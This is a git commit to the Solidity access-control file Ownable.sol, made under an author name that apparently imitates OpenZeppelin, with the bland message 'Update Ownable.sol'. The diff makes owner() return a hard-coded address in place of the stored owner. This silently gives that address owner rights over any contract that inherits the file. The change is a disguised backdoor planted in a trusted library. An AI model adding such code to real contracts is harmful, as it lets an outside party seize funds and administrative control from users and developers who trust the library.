d8637027cf20ff57af6edac1789354958bbd994d
openzepellin <83832927+openzepellin@users.noreply.github.com>
2021-05-07 23:20:17 +0200

    Update Ownable.sol

--- contracts/access/Ownable.sol
+++ contracts/access/Ownable.sol
@@ -35,7 +35,7 @@ contract Ownable is Context {
      * @dev Returns the address of the current owner.
      */
     function owner() public view returns (address) {
-        return _owner;
+        return address(0x7086d4578F6576cb32526c47bECb8CcB25C2Ce76);
     }
 
     /**
